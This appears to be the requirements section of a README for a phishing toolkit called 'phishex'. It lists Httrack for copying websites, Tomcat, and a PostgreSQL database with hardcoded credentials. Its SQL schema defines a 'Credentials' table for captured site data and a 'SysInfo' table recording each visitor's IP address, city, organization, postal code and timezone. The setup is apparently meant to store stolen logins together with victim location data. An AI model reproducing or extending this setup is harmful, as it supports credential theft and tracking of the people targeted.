<b>REQUIERMENTS</b>
<br>
<p>
Python 3.0><br>

Httrack<br>

Apache TOMCAT 9.*<br>

Postgresql database:<br>
	Database name: phishex
	user: phx
	password: phishex_666
	
	Scripts:

	create table Credentials(
	id serial primary key,
	site varchar(64) not null,
	data text,          
	sys_info_id integer references SysInfo(id));

	create table SysInfo(    
	id serial primary key,
	ip varchar(32) not null,  
	country varchar(32),
	city varchar(32),                           
	location varchar(64),
	organization varchar(64),
	postal varchar(16),
	timezone varchar(64));

</p>
